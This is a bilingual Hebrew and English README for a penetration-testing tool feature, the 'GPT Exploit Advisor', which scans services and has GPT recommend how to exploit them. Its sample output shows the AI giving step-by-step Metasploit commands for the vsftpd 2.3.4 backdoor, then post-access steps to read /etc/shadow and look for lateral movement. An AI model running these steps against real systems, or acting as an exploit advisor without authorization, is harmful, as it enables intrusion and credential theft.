# RedFlow - GPT Exploit Advisor
# RedFlow - יועץ אקספלויטים מבוסס GPT

## מבוא / Introduction
פיצ'ר חדש בכלי RedFlow המאפשר ניתוח של פגיעויות וקבלת המלצות לניצול באמצעות GPT. תכונה זו משלבת ניתוח מקומי של אקספלויטים יחד עם בינה מלאכותית מתקדמת כדי לספק המלצות מפורטות וישימות לגבי כיצד לנצל פגיעויות בשירותים שהתגלו.

This is a new feature in the RedFlow tool that allows for the analysis of vulnerabilities and recommendations for exploitation using GPT. This feature combines local exploit analysis with advanced artificial intelligence to provide detailed and actionable recommendations on how to exploit vulnerabilities in discovered services.

## התקנה / Installation

### דרישות מערכת / System Requirements
- סביבת Kali Linux או מערכת דומה
- Python 3.7 ומעלה
- הרשאות רוט (לטובת כלים כמו nmap)
- מפתח API של OpenAI

---
- Kali Linux environment or similar system
- Python 3.7 or later
- Root permissions (for tools like nmap)
- OpenAI API key

### הוראות התקנה / Installation Instructions

1. שבט את מאגר הקוד:
   ```bash
   git clone https://github.com/your-username/RedFlow.git
   cd RedFlow
   ```

2. הרץ את סקריפט ההתקנה:
   ```bash
   chmod +x install.sh
   sudo ./install.sh
   ```

3. הגדר מפתח API של OpenAI:
   ```bash
   echo "YOUR_OPENAI_API_KEY" > ~/.openai_api_key
   ```

   או הגדר בקובץ תצורה `config.yaml`:
   ```yaml
   gpt:
     api_key: "YOUR_OPENAI_API_KEY"
     model: "gpt-4"
   ```
   
---

1. Clone the repository:
   ```bash
   git clone https://github.com/your-username/RedFlow.git
   cd RedFlow
   ```

2. Run the installation script:
   ```bash
   chmod +x install.sh
   sudo ./install.sh
   ```

3. Set your OpenAI API key:
   ```bash
   echo "YOUR_OPENAI_API_KEY" > ~/.openai_api_key
   ```

   Or configure in `config.yaml`:
   ```yaml
   gpt:
     api_key: "YOUR_OPENAI_API_KEY"
     model: "gpt-4"
   ```

## שימוש / Usage

### הפעלת GPT Exploit Advisor
ניתן להפעיל את יועץ האקספלויטים מבוסס GPT באמצעות דגל `--gpt-advisor`:

```bash
python3 redflow.py --target example.com --gpt-advisor
```

או אם כבר הרצת סריקה קודמת:

```bash
python3 redflow.py --gpt-advisor
```

יועץ האקספלויטים גם זמין מתוך התפריט האינטראקטיבי:

```bash
python3 redflow.py --menu
```

---

### Running GPT Exploit Advisor
You can run the GPT Exploit Advisor using the `--gpt-advisor` flag:

```bash
python3 redflow.py --target example.com --gpt-advisor
```

Or if you've already run a previous scan:

```bash
python3 redflow.py --gpt-advisor
```

The Exploit Advisor is also available from the interactive menu:

```bash
python3 redflow.py --menu
```

### מאפיינים עיקריים / Key Features

- **ניתוח אוטומטי של פגיעויות**: זיהוי של אקספלויטים פוטנציאליים עבור שירותים שהתגלו
- **המלצות מבוססות GPT**: קבלת ניתוח מפורט מ-GPT לגבי כיצד לנצל פגיעויות
- **הוראות מפורטות**: קבלת צעדים מדויקים לניצול כל פגיעות
- **תמיכה במגוון רחב של שירותים**: תמיכה בניתוח ושימוש באקספלויטים עבור FTP, SSH, HTTP ועוד
- **אינטגרציה עם Metasploit**: יכולת להפעיל אקספלויטים ישירות מתוך Metasploit

---

- **Automated vulnerability analysis**: Identification of potential exploits for discovered services
- **GPT-based recommendations**: Get detailed analysis from GPT on how to exploit vulnerabilities
- **Detailed instructions**: Receive precise steps for exploiting each vulnerability
- **Support for a wide range of services**: Support for analyzing and using exploits for FTP, SSH, HTTP, and more
- **Metasploit integration**: Ability to run exploits directly from Metasploit

### דוגמאות שימוש / Usage Examples

#### 1. סריקה וניתוח אקספלויטים
```bash
# סריקה מלאה עם ניתוח GPT
python3 redflow.py --target 192.168.1.10 --mode full --gpt-advisor --use-gpt
```

#### 2. ניתוח שירות ספציפי
```bash
# מיקוד על שירות FTP
python3 redflow.py --target 192.168.1.10 --port 21 --gpt-advisor
```

#### 3. שימוש אינטראקטיבי
```bash
# תפריט אינטראקטיבי
python3 redflow.py --menu
# בחר להפעיל GPT Exploit Advisor
```

---

#### 1. Scanning and Exploit Analysis
```bash
# Full scan with GPT analysis
python3 redflow.py --target 192.168.1.10 --mode full --gpt-advisor --use-gpt
```

#### 2. Analyzing a Specific Service
```bash
# Focus on FTP service
python3 redflow.py --target 192.168.1.10 --port 21 --gpt-advisor
```

#### 3. Interactive Usage
```bash
# Interactive menu
python3 redflow.py --menu
# Choose to enable GPT Exploit Advisor
```

## פלט לדוגמה / Sample Output

```
[bold blue]======== RedFlow + GPT Exploit Advisor ========[/bold blue]
[bold blue]This feature suggests exploits based on detected services[/bold blue]

[bold cyan]Found services:[/bold cyan]
1. [bold]vsftpd 2.3.4[/bold] on port 21
2. [bold]Apache 2.4.49[/bold] on port 80

[bold cyan]Select service to analyze (1-2, or 'q' to quit):[/bold cyan]
> 1

[bold green]Found 3 potential exploits:[/bold green]
[1] vsftpd 2.3.4 - Backdoor Command Execution
[2] vsftpd 2.3.4 - Denial of Service
[3] vsftpd 2.3.4 - 'seccomp sandbox' Privilege Escalation

[bold cyan]Select exploit to analyze with GPT (number or 'skip'):[/bold cyan]
> 1

[bold green]GPT Analysis:[/bold green]
───────────────────────────────────────────────────
│ GPT ניתוח פגיעות                                  │
───────────────────────────────────────────────────
│ # ניתוח פגיעות                                    │
│                                                   │
│ ## מטרה                                           │
│ - **שירות**: vsftpd 2.3.4                         │
│ - **אקספלויט**: vsftpd 2.3.4 - Backdoor Command Execution │
│                                                   │
│ ## ניתוח                                          │
│ פגיעות זו מנצלת backdoor שהוכנס לקוד המקור של vsftpd 2.3.4. │
│ כאשר משתמש מנסה להתחבר עם שם משתמש שמכיל את המחרוזת ':)' │
│ מופעל backdoor שפותח shell בפורט 6200.            │
│                                                   │
│ ## הוראות ביצוע                                    │
│                                                   │
│ 1. בדוק אם ה-backdoor פעיל:                       │
│    ```                                            │
│    nc -v <TARGET_IP> 21                           │
│    ```                                            │
│                                                   │
│ 2. הרץ את האקספלויט:                              │
│    ```                                            │
│    msfconsole -q                                  │
│    use exploit/unix/ftp/vsftpd_234_backdoor       │
│    set RHOSTS <TARGET_IP>                         │
│    run                                            │
│    ```                                            │
│                                                   │
│ ## תוצאה צפויה                                     │
│ גישת root למערכת.                                  │
│                                                   │
│ ## פעולות לאחר השגת גישה                           │
│ 1. בדוק הרשאות: `id` ו-`whoami`                   │
│ 2. חפש קבצים רגישים ב-`/etc/passwd`, `/etc/shadow` │
│ 3. בדוק אפשרויות לתנועה רוחבית ברשת               │
───────────────────────────────────────────────────
```

## פיתוח והרחבה / Development and Extension

### הוספת מודולים חדשים / Adding New Modules
התכונה בנויה בצורה מודולרית ותומכת בהוספה קלה של מנועי ניתוח וחיפוש אקספלויטים חדשים.

הרחבת שיטות ניתוח:
1. הוסף שיטות חדשות ל-`ExploitAdvisor` ב-`redflow/modules/gpt/exploit_advisor.py`
2. עדכן את שיטת `generate_gpt_prompt` כדי לתמוך בסוגים חדשים של פגיעויות

---

The feature is built in a modular way and supports easy addition of new analysis engines and exploit search engines.

Extending analysis methods:
1. Add new methods to `ExploitAdvisor` in `redflow/modules/gpt/exploit_advisor.py`
2. Update the `generate_gpt_prompt` method to support new types of vulnerabilities

### הגדרת תצורה / Configuration
ניתן להתאים את התנהגות ה-GPT Exploit Advisor באמצעות קובץ התצורה `config.yaml`:

```yaml
gpt:
  api_key: "YOUR_API_KEY_HERE"
  model: "gpt-4"  # או "gpt-3.5-turbo" לביצועים מהירים יותר
  temperature: 0.7
  custom_prompt: "ניתוח מותאם אישית של פגיעויות"
```

---

You can customize the behavior of the GPT Exploit Advisor using the `config.yaml` configuration file:

```yaml
gpt:
  api_key: "YOUR_API_KEY_HERE"
  model: "gpt-4"  # or "gpt-3.5-turbo" for faster performance
  temperature: 0.7
  custom_prompt: "Custom vulnerability analysis"
```

## פתרון בעיות / Troubleshooting

### בעיות נפוצות / Common Issues

1. **שגיאת מפתח API לא חוקי**
   - פתרון: ודא שמפתח ה-API של OpenAI קיים ותקף
   - הגדר את המפתח ב-`~/.openai_api_key` או ב-`config.yaml`

2. **שגיאות זמן ריצה**
   - פתרון: ודא שהתקנת את כל התלויות באמצעות `install.sh`
   - בדוק שהיישום מורץ עם הרשאות מתאימות

3. **לא נמצאו אקספלויטים**
   - פתרון: עדכן את מסד הנתונים של searchsploit: `searchsploit -u`
   - ודא שהמטרה נסרקה כראוי לפני השימוש ב-GPT Exploit Advisor

---

1. **Invalid API Key Error**
   - Solution: Ensure your OpenAI API key exists and is valid
   - Set the key in `~/.openai_api_key` or in `config.yaml`

2. **Runtime Errors**
   - Solution: Make sure you've installed all dependencies using `install.sh`
   - Check that the application is running with appropriate permissions

3. **No Exploits Found**
   - Solution: Update searchsploit database: `searchsploit -u`
   - Ensure the target was properly scanned before using GPT Exploit Advisor

## תרומה / Contributing
אנו מעודדים תרומות ושיפורים למערכת הניתוח וההמלצות. תוכל להגיש בקשות משיכה (Pull Requests) דרך GitHub.

אם ברצונך לשפר את המערכת, אנא שקול:
- הוספת תמיכה בסוגים נוספים של יעדים/שירותים
- שיפור פרומפטים ל-GPT לקבלת תוצאות איכותיות יותר
- יצירת מודולים חדשים לניתוח וניצול

---

We encourage contributions and improvements to the analysis and recommendation system. You can submit Pull Requests via GitHub.

If you wish to improve the system, please consider:
- Adding support for additional types of targets/services
- Improving prompts for GPT to get higher quality results
- Creating new modules for analysis and exploitation

## רישיון / License
MIT

---
Created by RedFlow Team 